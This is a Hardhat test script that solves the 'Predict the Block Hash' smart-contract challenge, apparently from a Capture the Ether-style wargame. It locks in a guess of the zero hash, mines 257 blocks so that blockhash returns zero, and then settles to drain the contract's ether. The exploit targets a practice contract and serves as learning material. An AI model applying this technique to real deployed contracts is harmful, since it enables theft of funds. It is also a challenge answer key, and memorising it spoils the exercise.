import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {

    //Vulnerability is that the settlementBlockNumber will only have it's hash for the 256 blocks and then return hash of 0

    //Lock in the hash of 0.
    await target.lockInGuess(ethers.constants.HashZero, { value: utils.parseEther('1') });

    //Mine enough blocks to get settlementBlockNumber to 0.
    for (let i = 0; i < 257; i++) {
      await provider.send('evm_mine', []);
    }
    
    await target.settle();
    
    expect(await target.isComplete()).to.equal(true);
  });
});
